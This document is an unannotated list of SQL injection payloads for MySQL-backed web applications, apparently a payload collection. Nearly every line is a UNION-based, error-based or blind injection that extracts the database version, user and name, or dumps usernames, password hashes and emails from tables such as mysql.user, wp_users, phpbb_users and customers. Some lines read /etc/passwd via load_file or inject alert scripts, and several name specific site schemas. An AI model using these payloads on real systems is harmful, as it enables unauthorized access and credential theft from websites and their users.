"-99999 union select 1,2,3,AES_DECRYPT(AES_ENCRYPT(USER(),  0x71),0x71),5,6,7,8,9,10,11/*"
"-99999 union select 1,2,3,concat_"
"99999 union select 1,2,3,concat(version(),0x3a,user(),0x3a,database()),5,6,7,8,9,10,11"
"-99999 union select 1,2,3,concat_ws(0x3a,id,username,password),5,6,7 from users/*"
"-99999 union select 1,2,3,concat_ws(0x3a,login,password,access_level),5 from users--"
"-99999 union select 1,2,3,concat_ws(0x3a,user(),version(),database()),5/*"
"9-999.9 union select 1,2,3,concat_ws(0x3a,version(),user(),database()),5--"
"99999 union select 1,2,3,concat_ws(0x3a,version(),user(),database()),5,6,7,8,9,10,11,12,13,14,15/*"
"99999 union select 1,2,3,convert(concat(version(),0x3a,user(),0x3a,database()),binary),5,6,7,8,9,10,11/*"
"-99999 union select 1,2,3,cos(pi()/10),5,6,7,8,9/*"
"99999 union select 1,2,concat(0x3a3a,user(),0x3a3a,version(),0x3a3a,database()),4,5,6,7,8,9,10,11/*"
"99999 union select 1,2,concat(customers_lastname,0x3a,customers_password,0x3a,customers_email_address),4,5,6,7,8 from customers--"
"99999 union select 1,2,concat(customers_lastname,0x3a,customers_password,0x3a,customers_email_address),4,5,6,7,8 from customers/*"
"-99999 union select 1,2,concat(login,0x3a,password),4,5,6,7,8 from users--"
"-99999 union select 1,2,concat(login,0x3a,password),4,5,6,7,8 from users/*"
"99999 union select 1,2,concat(user,char(58),password),4,5,6,7,8,9,10,11,12,13 from mysql.user/*"
"99999 union select 1,2,concat(version(),char(58),user(),char(58),database()),4,5,6,7,8,9,10,11 /*"
"- 99999 union select 1,2,concat_ws(0x3a,ADMINISTRATOR_ID,LOGIN,PASSWORD_MD5),4,5,6,7,8,9,10,  11,12,13,14 from ADMINISTRATOR/*"
"-99999 union select 1,2,concat_ws(0x3a,user(),database(),version()),4,5,6 from amx_webadmins"
"99999 union select 1,2,concat_ws(0x3a,username,password),4,5,6,7,8,9,10 FROMusers --"
"99999 union select 1,2,concat_ws(0x3a,username,password,email),4,5,6 from user limit 2,1/*"
"-99999' union select 1,2,concat_ws(0x3a,user,password) from mysql.user/*"
"-99999 union select 1,2,concat_ws(0x3a,version(),user(),database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--"
"99999 union select 1,2,password,4,5,6,7 from members"
"99999 union select 1,2,unhex(hex(version()))/*"
"-99999 UNION SELECT 1,2,user() --"
"99999 union select 1,2,user,4,5,6,7,password,9,10,11,12,13 from mysql.user/*"
"99999 union select 1,2,user_name,password,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin/*"
"-99999 union select 1,2,user(),version(),database()/*"
"99999 union select 1,2,version()/*"
"9-999.9 union select 1,2,version(),4,5,6,7,8,9,10,11,12--"
"99999 union select 1,2,VERSION(),4,5,6,7,8,9,10,11,12,13,14,15,16,17/*"
"99999' union select 1,2,VERSION(),4,5,6,7,8,9,10,11,12,13,14,15,16,17/*"
"99999 union select 1,2,version() from news--"
"99999 union select 1,2,version(),user(),database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20/*"
"99999' union select 1,AES_DECRYPT(AES_ENCRYPT(password,0x71),0x71),3,4 from users limit 1,1/*"
"99999' union select 1,AES_DECRYPT(AES_ENCRYPT(VERSION(),0x71),0x71)/*"
"99999 union select 1,concat(username,0x3a,user_password,0x3a,user_email,0x3a,user_icq),3,4,5,6,7,8,9,10 from phpbb_users limit 1,1/*"
"-99999 union select 1,concat(version(),0x3a,user(),0x3a,database()),3,4,5,6,7"
"99999 UNIOn SELECT 1,concat_ws(0x3a3a,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13 --"
"-99999 UNION SELECT 1,concat_ws(0x3a,email,parol),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from objav/*"
"99999 union select 1,concat_ws(0x3a ,user(),database(),version()),3,4/*"
"99999 union select 1,concat_ws(0x3a,user(),database(),version()),3,4/*"
"99999 union select 1,concat_ws(0x3a,username,password),3,4 from baltic_phpmotion.admin/*"
"-99999 union select 1,concat_ws(0x3a,user,password),3 from mysql.user/*"
"99999' union select 1,concat_ws(0x3a,version()),3/*"
"99999 union select 1,concat_ws(0x3b, user(),database(),version()),3,4,5,6--"
"99999 union select 1,concat_ws(0x40,host,user,password,file_priv,version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from mysql.user/*"
"99999' union select 1,group_concat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables group by table_schema limit 1,1 --"
"99999 union select 1,username,3,password,5,6,7,8 from users--"
"99999 union select 1,VERSION(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/*"
"99999 union select 1,VERSION(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21/*"
"99999 union select 1,VERSION(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26/*"
"99999 union select 1,version(),user()/*"
"99999 union select 1,version(),user(),database(),5,6,7,8,9/*"
"99999 union select concat_ws(0x3a,database(),version(),user()),2--"
"99999 union select concat_ws(0x3a,login,pwd),2 from rabota_1.users/*"
"99999' union select concat_ws(0x3a,user(),database(),version()),2,3/*"
"99999 union select concat_ws(0x3a,user(),database(),version()),2,3,4,5,6,7,8,9,10,11,12,13,14,15/*"
"99999 union select concat_ws(0x3a,username,password,email),2,3,4,5,6,7,8,9,10,11,12 from users limit 2,1/*"
"99999' union select concat_ws(0x3a,username,password) from onthec5_main.users limit 0,1/*"
"99999 union select concat_ws(0x3a,user,password),2,3 from mysql.user/*"
"99999 union select concat_ws(0x3a,version(),user() ,database(),@@version_compile_os),2,3,4,5,6,7--"
"-99999 union select concat_ws(char(58),DATABASE(),USER(),VERSION())--"
99999) union select unhex(hex(version()))/*
99999) union select version()/*
"99999 union select VERSION(),2,3/*"
"-99999 union select version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--"
"-9999 and 1=2 union select 1,aes_decrypt(aes_encrypt(concat_ws(0x3a,@@version,user(),@@version_compile_os),0x71),0x71),3,4,5,6,7,8,9,10,11,12--"
"9999 or 1 group by concat(concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os),rand(0)|0) having min(0)--"
"9999 or 1 group by concat((select email from 2on2hockeyDB limit 0,1),rand(0)|0) having min(0)--"
"9999 or (select count(*) from (select 1 union select 2 union select 3)x group by concat(mid(concat_ws(0x0b,version(),user(),database(),@@version_compile_os,0x0b), 1, 70), floor(rand(0)*2)))--"
"-9999 union all select 1,2,3,concat(user,char(58),pass,0x7c,0x7c),5,6 from users--"
"-9999 union all select 1,2,3,concat(username,char(58),password) from users--"
"-9999 union all select 1,2,concat(user_name,char(58),user_password),null,5,6,7,null,9,10,11,12,13 from users--"
"-9999 union all select 1,2,convert(concat_ws(char(58),username,password) using utf8),4,null,6,null,8,9 from login--"
"-9999 union all select 1,concat_ws(char(58),user,password),3,4,5 from mysql.user--"
"9999 union select 0,1,concat(USER(),0x3a,VERSION(),0x3a,DATABASE(),0x3a),3,4,5,6,7,8/*"
"9999 union select 0,concat_ws(0x3a,version(),database(),user()),2,3,4,5,6,7,8,9,10/*"
"9999 union select 0,concat_ws(char(32,32),version(),user(),database()),username, CHAR(32,58,32), user_password),2,3,4,5--"
"-9999 union select 1,2,3,4,5,6*"
"9999 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,concat(user(),0x3a,version(),0x3a,database()),26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43/*"
"9999 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,concat_ws(0x3a,email,password,login),25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88 from pravmamba_users limit 0,1"
"9999 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,concat_ws(0x3a,version(),database(),user()),16,17,18,19,20--"
"9999 union select 1,2,3,4,5,6,7,8,9,10,concat(login,0x3a,pwd),12,13,14,15,16,17,18,19,20 from lnkxchange_admins/*"
"9999 union select 1,2,3,4,5,6,7,8,9,concat_ws(0x3a,login,password,email,name),11,12 from user/*"
"9999 union select 1,2,3,4,5,6,7,8,version(),10,11 from news--"
"9999 union select 1,2,3,4,5,6,7,concat_ws(0x3a,version(),database(),user()),9,10,11,12,13,14,15,16,17,18,19,20"
"9999 union select 1,2,3,4,5,6,7 from admin/*"
"-9999 union select 1,2,3,4,5,6,concat_ws(0x3a,version(),database (), user()),8,9,10,11,12,13,14,15,16,17,18/*"
"9999 union select 1,2,3,4,5,concat(user(),0x3a,version(),0x3a,database()),7/*"
"9999 union select 1,2,3,4,5,concat_ws(0x3a3a,version(),user(),database()) --"
"9999 union select 1,2,3,4,5,concat_ws(0x3a,username,upass,uemail),7 from users/*"
"9999 union select 1,2,3,4,5,concat_ws(char(32,58,32),user(),database(),version()),7,8,9,10/*"
"9999 union select 1,2,3,4,5,version(),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
"9999 union select 1,2,3,4,aes_decrypt(aes_encrypt(version(),0x71),0x71)/*"
"9999' union select 1,2,3,4,concat(id,':',login,':',pass),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from user--"
"9999 union select 1,2,3,4,concat(user(),0x3a,version(),0x3a,database()),6,7,8,9,10,11,12,13,14,15,16/*"
"-9999 union select 1,2,3,4,concat_ws(0x3a,database(),version(),user()),6,7,8,9,10,11,12,13,14/*"
"-9999 union Select 1,2,3,4,concat_ws(0x3a,version(),user(),database()),6,7,8,9,10,11,12,13,14,15/*"
"9999 union select 1,2,3,4,concat_ws(0x40,id,username,password) from users limit 0,1--"
"9999 union select 1,2,3,4,version(),6,7,8--"
"9999 union select 1,2,3,concat(database(),0x3a,user(),0x3a,version()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/*"
"9999 union select 1,2,3,concat(user(),0x3a,version(),0x3a,database()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21/*"
"9999 union select 1,2,3,concat(version(),0x3a,user(),0x3a,database()),5,6,7"
"-9999 union select 1,2,3,concat_ws(0x203a3a3a20,version(),user(),database()),5,6,7,8,9,10,11,12/*"
"9999 union select 1,2,3,concat_ws(0x2F,user,password),5,6,7 from mysql.user/*"
"-9999 union select 1,2,3,load_file(0x2f6574632f706173737764),5,6,7,8,9,10/*"
"-9999 union select 1,2,3,USER(),VERSION(),6,7,8,9,10,11,12/*"
"9999 union select 1,2,3,version()--"
"9999 union select 1,2,3,version(),5,6--"
"9999' union select 1,2,concat(convert(name using latin1),0x3a,convert(password using latin1)),concat(user(),0x3a,version(),0x3a,database()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 from jos_users --"
"9999 union select 1,2,concat(user,0x3a,pass) from users limit 0,1/*"
"-9999 union select 1,2,concat(user(),0x3a,version()),4"
"9999 union select 1,2,concat(version(),0x3a,user(),0x3a,database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21"
"-9999 union select 1,2,concat_ws(0x20,version(),"
"9999 union select 1,2,concat_ws(0x3a,admin_login,admin_password),4,5,6,7 from koleso_ktopof.admins/*"
"-9999 union select 1,2,concat_ws(0x3a,user(),database(),version()),4/*"
"-9999 union select 1,2,concat_ws(0x3a, version(), user(), database()),4,5,6,7,8,9,10,11,12/*"
"9999 union select 1,2,database()/*"
"9999 union select 1,2,group_concat(column_name separator 0x0a) from information_schema.columns where table_name=0x636f7374 --"
"9999 union select 1,2,login,4,email,6,7,8,psw from users limit 558 , 1/*"
"-9999 union select 1,2,password from users/*"
"9999 union select 1,2,TABLE_NAME,4,5,6,7,8,9,0,1,2,3,4,5,6 from INFORMATION_SCHEMA.TABLES--"
"9999 union select 1,2,USER(),4,5,VERSION(),7,8,9,DATABASE(),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/*"
"9999 union select 1,2,username,userpass from poll_user/*"
"999.9' union select 1,2,version(),4,5,6 --"
"9999 union select 1,2,version(),4,5,6,7,8/*"
"9999 union select 1,concat(user(),0x3a,database()),3,4,5,6/*"
"9999 union select 1,concat(user(),0x3a,version(),0x3a,database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/*"
"9999 union select 1,concat(USER(),DATABASE()),3,4,5,6,7/*"
"-9999 union select 1,concat(version(),char(58,58),database(),char(58,58),user()),3,4,5,6,7,8/*"
"9999 union select 1,concat_ws(0x2F,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17/*"
"9999 unioN select 1,concat_ws(0x3a3a,version(),user(),database()),3,4,5,6,7/*"
"-9999 union select 1,concat_ws(0x3a  ,user(),database(),version()),3,4/*"
"-9999 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12/*"
"9999 union select 1,concat_ws(0x3a,version(),user(),database()),3,4,5,6,7/*"
"-999.9 UNION SELECT 1,concat_ws(user(),version(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16--"
"9999 union select 1,table_name,3,4,5,6,7,8,9,10,11,12,13 from information_schema.tables limit 18,1--"
"9999 union select 1,TABLE_NAME,3,4,5,6,7,8 from INFORMATION_SCHEMA.TABLES/*"
"9999 union select 1,table_name,3,4,5,6 from information_schema.tables limit 17,1--"
"9999 union select 1,unhex(hex(concat_ws(0xb,admin_email,admin_password))),3,4,5,6 from tbl_admin_user limit 0,1--"
"9999 union select 1,@@version,3,4 /*"
"9999 union select 1,version(),3,4,concat(login,char(58),password),6,7 from users/*"
"-9999 UNION SELECT concat(user_login,0x3a,user_pass,0x3a,user_email) FROM wp_users--"
"9999' Union sElecT concat_ws(0x2a3a2a,'""><h1>',version(),database(),user(),@@version_compile_os)--"
"-9999 UNION SELECT concat_ws(char(58),user_name,user_password) from e107_user where user_id=1--"
"-9999 UNION SELECT concat_ws(char(58),user_name,user_password)KHG from e107_user where user_id=1--"
"9999 union select convert(version(),char) from users/*"
"9999 union select database(),version(),3,4,5,6,7,8,9,10,11,12,user(),14,15,16--"
"9999 union select mysql.user.user,mysql.user.password,2,3,4,5 from mysql.user/*"
"-9999 union select null,null,null,concat_ws(0x2A,login,pwd_hash,email),null,null,null FROM u15364.ra_users/*"
"9999 union select null,null,null,null,null,null,null,null,9,CONVERT(concat_ws(0x3a,user(),Version(),database()),binary),11,12,13,14,15 --"
"9999 union select null,null,null,table_name,null,null FROM INFORMATION_SCHEMA.TABLES--"
"-9999' union select table_name,column_name from information_schema.columns limit 264,1/*"
"-9999 UNION SELECT user(),2,version()/*"
"999' or (select count(*) from (select 1 union select 2 union select 3)x group by concat(concat_ws(0x0b,version(),user(),database(),@@version_compile_os),floor(rand(0)*2)))--"
"999 UNION ALL SELECT 1,2,3,4,5,6,7,8,concat_ws(0x3a,user(),version()),10,11--"
"-999 union all select 1,unhex(hex(concat_ws(0x203a20,user(),version()))),3--"
"999 union all select concat_ws(0x2f,version(),user(),database())"
"999 UNION ALL SELECT null,null,null,null,null,null,null,null,null,CONCAT(0x3C7363726970743E616C6572742827,Version(),0x3a,user(),0x27293C2F7363726970743E),null,null,null,null --"
"999 union select 0,1,table_name,user(),4,5,6,7,8,version(),10,11,12,13,14,15,16,17,18,19,20,21,21,22,23,24,25,26,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 from INFORMATION_SCHEMA.TABLES/*"
"999 union select 0,concat(USER(),0x3a,VERSION(),0x3a,DATABASE()),2,3,4,5,6,7,8,9,10,11,12,13,14,15/*"
"999 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,version(),71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,343,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419--"
"999' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,version(),69,70--"
"-999 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,concat(name,0x3a,pwd),20,21,22 from maika_users/*"
"999 union select 1,2,3,4,5,6,7,8,9,10,11,concat(column_name,0x3a,table_name,0x3a),13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41 from INFORMATION_SCHEMA.COLUMNS limit 1,1/*/*"
"999 union select 1,2,3,4,5,6,7,8,9,10,11,concat(user,0x3a,password,0x3a3a3a,host),13,14,15,16,17,18,19,20,21,22,23 from mysql.user/*"
"999 union select 1,2,3,4,5,6,7,8,9,10,concat(version(),0x3a,user(),0x3a,database()),12,13,14,15,16,17,18/*"
"-999 union select 1,2,3,4,5,6,7,8,9,concat_ws(0x3a, version(),user(),database()),11,12,13"
"999 union select 1,2,3,4,5,6,7,8,concat_ws(0x3a,id,email,login,password),10,11,12,13,14,15,16,17,18,19,20,21,22,23 from users"
"999') union select 1,2,3,4,5,6,7,8,user(),version(),database(),12,13,14,15,16,17,18,19,20,21/*"
"999 UNION SELECT 1,2,3,4,5,6,7,concat_ws(0x3a,user(),version(),database()),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34/*"
"-999 union select 1,2,3,4,5,6,concat_ws(0x3a,user(),database(),version()),8,9,10,11,12,13,14,15,16,17,18"
"999 union select 1,2,3,4,5,6,unhex(hex(concat_ws(0x3,user(),database(),version()))),8/*"
"999 union select 1,2,3,4,5,concat_ws(0x3a,database(),user(),version()),7/*"
"-999 union select 1,2,3,4,concat(0x3a,version(),0x3a,user(),0x3a,database(),0x3a),6,7,8,9,10,11,12,13--"
"999 union select 1,2,3,4,concat_ws(0x3a,database(),user(),version()),6,7,8,9,10,11,12,13,14/*"
"999 union select 1,2,3,4,table_name,6,7,8 from information_schema.tables limit 17,1--"
"999 union select 1,2,3,4,user(),6,7,database(),9,10,11,version(),13,current_date(),15,16,17,18,19,20,21,22,23/*"
"999 union select 1,2,3,4,version(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--"
"999 UNION SELECT 1,2,3,CHAR(104,97,99,107,51,100),5,CHAR(104,97,99,107,51,100),7,8/*"
"999 union select 1,2,3,concat_ws(0x2F,user,pass,mail),5,6,7,8,9,10,11 from usuarios/*"
"999 union select 1,2,3,concat_ws(0x3a3a,username,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from admin/*"
"999 UNION SELECT 1,2,3,concat_ws(0x3a3a,version(),user(),database()),5,6 --"
"-999 UNION SELECT 1,2,3,concat_ws(0x3a,user(),database(),version()),5,6,7,8,9,10,11,12,13,14,15,16,17 --"
"999 union select 1,2,3,database(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19/*"
"-9_99 union select 1,2,3,version(),5,6,user(),8,database(),10,11,12"
"-999 union select 1,2,concat(version(),char(58,58),database(),char(58,58),user()),4,5/*"
"999 union select 1,2,concat_ws(0x3a,database(),user(),version()),4,5,6,7,8/*"
"-999 union select 1,2,concat_ws(0x3a,user(),database(),version()),4,5,6 from amx_webadmins"
"999 union select 1,2,concat_ws(char(58,58),id,pass,username) from pb_users where id=1/*"
"-999 union select 1,2,user(),version(),5,6,7,8,9/*"
"999 union select 1,concat(id,0x3a,name,0x3a,usr,0x3a,passwd) from users limit 0,1/*"
"999 union select 1,concat(user,char(58),password,char(58),File_priv,char(58),host) from mysql.user"
"-999' UNION SELECT 1,concat(username,0x3a,password),3,4 from users limit 0,1/*"
"999 union select 1,CONCAT(username,CHAR(32,58,32),password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38 from auth/*"
"-999 union select 1,concat(version(),0x3a,user(),0x3a,database())--"
"-999' union select 1,concat(version(),0x3a,user()),3,4,5,6,7,8,9,0/*"
"-999 union select 1,concat(version(),0x3b,database(),0x3b,user()),3,4,5,6,7,8--"
"999 union select 1,concat_ws(0x0b,version(),user(),database(),@@version_compile_os),3,4,5,6,7,8,9/*"
"999 union select 1,concat_ws(0x3a,name,pass,email),3,4,5,6,7,8,9 from users--"
"-999 union select 1,concat_ws(0x3a,user(),database(),version()),3,4"
"-999 UNION SELECT 1,concat_ws(0x3a,user(),database(),version()),3,4,5 --"
"999 union select 1,concat_ws(0x3a,user(),version(),database()),table_name,4 from information_schema.tables/*"
"999 union select 1,concat_ws(0x3a,version(),database(),user()),3,concat_ws(0x3a,name,email,login,password,idstatus,info1,info2,info3) from a_user limit 2,1--"
"999 union select 1,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),3,4,5,6,7,8--"
"-999 union select 1,concat_ws(char(32,45,32), version(),user(),database()),3,4--"
"999 union select 1,login,3,user_password,5,6,7 from user/*"
"999 union select 1,password,3,4,5,6,7 from user/*"
"-999 union select 1,table_name,3,4,5,6,7,8 from information_schema.tables limit 1,1/*"
"999 union select 1,user(),version(),4,5,6"
"-999' union select 1,version(),user(),4/*"
"999 union select concat(0x3b,table_name,table_schema),2,3,4 from information_schema.tables/*"
"999 union select concat(0x626C61626C61,0x3,version(),user(),database())/*"
"999 union select concat(user(),char(58),database(),char(58),version())/*"
"999 union select concat(username,0x3a,psswd,version()) from users"
"999 /*!union*/ select /*!concat_ws(0x0b,version(),user(),database(),@@version_compile_os)*/--"
"999' union select concat_ws(0x3a,database(),user(),version()),2,3,4,5,6,7/*"
"999 union select concat_ws(0x3a,password,username,login),2,3 from contest.admins limit 2,1--"
"999' union select concat_ws(0x3a,table_name,table_schema) from information_schema.columns where column_name like 0x70617373776f7264--"
"999 union select concat_ws(0x3a,version(),user(),database()),2,3,4,5,6/*"
"-999' union select concat_ws(':',user(),version(),database()),2,3,4,5,6,7,8,9,10,11,12,13,14,'2"
-999 union SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--
"999 union select load_file('/lala'),2,3,4 from information_schema.tables/*"
-999 union select null--
999' union select null/*
"999 union select null,null,null,null,null,uid from users where uid=2/*"
"-999 union select version(),2,3--"
"99 and 1=0 union select version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"
"99' and 1=2 union select 1,2,3,4,group_concat(concat_ws(0x3a,username,password)),6,7,8,9,10,11,12,131,14 from users --"
"99 and 1=if((select substring(version(),1,1)<=5),1,(select 1 union select 2))"
"99'   and 1=(select count(*) from (select 1 union select 2 union select 3)x group by concat(version(),floor(rand(0)*2)))--"
"9.9 union all select 1,concat_ws(0x3a,user(),version(),database()),3,4,5,6 --"
"-99 union all select 1,concat_ws(0x3a,@@version,user(),database(),@@version_compile_os),3,4,5,6,7--"
"-99 union select 1,0x6869206d616e20212121,3,4,5,6 from mysql.user/*"
"-99 union select 1,2,0x707265766564203a44,4,5,6,7,8,9,10,11/*"
"-99 union select 1,2,3,0x707265766564,5,6,7,8,9,10,11,12,13,14/*"
"-99' union select 1,2,3,4,5,6,7,8,9,10,11,12/*"
"-99 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,concat(user,0x3a,password),24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57 from mysql.user limit 1,1/*"
"-99 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,concat(uname,0x3a,pass),21 from cinema_user limit 0,1/*"
"-99 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,user()/*"
"-99 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,version(),17,18,19,20,21,22,23--"
"-99 union select 1,2,3,4,5,6,7,8,9,10,11 from admin--"
"-99 union select 1,2,3,4,5,6,7,8,9,user(),11/*"
"-99 union select 1,2,3,4,5,6,7,8 from mysql.user/*"
"-99' union select 1,2,3,4,5,6,7,8,version(),0,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97/*"
"-99) union select 1,2,3,4,5,6,7,8,version(),10,11,12,13/*"
"-99 union select 1,2,3,4,5,6,7,concat(login,0x3a,password),9,10 from user limit 0,1/*"
"-99 union select 1,2,3,4,5,6,char(60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,112,114,101,118,101,100,39,41,60,47,115,99,114,105,112,116,62),8/*"
"-99 union select 1,2,3,4,5,concat(username,0x3a,password),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 from user/*"
"-99 union select 1,2,3,4,5,group_concat(table_name),7,8,9,10,11,12,13 from information_schema.tables group by table_schema limit 0,1 --"
"99 union select 1,2,3,4,5,id,7,8 from user/*"
"-99' union select 1,2,3,4,5,table_name,7,8,9,10,11,12 from information_schema.tables limit 1,1/*"
"-99' union select 1,2,3,4,concat(login,0x3a,password) from users limit 1,1/*"
"-99 union select 1,2,3,4,concat(name,0x3a,pass),6,7,8,9,10 from users limit 1,1/*"
"-99 union select 1,2,3,4,Convert(database() using cp1251),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,21,22,23,24/*"
"-99 union select 1,2,3,4,group_concat(column_name),6,7,8,9,10,11 from information_schema.columns where table_name=0x6D656D627265 --"
"-99' union select 1,2,3,4,'hmm',6,7,8,9,10,11,12/*"
"-99 union select 1,2,3,4,pwd,aid,7,8,9,10,11,12,13,14 from nuke_authors limit 1,1/*"
"-99 union select 1,2,3,concat(uid,0x3a,uname,0x3a,pass),5 from kosnet_users/*"
"-99 union select 1,2,3,concat(username,0x3a,user_password),5,6,7,8,9,10,11,12,13,14,15,16,17 from phpbb_users limit 1,1/*"
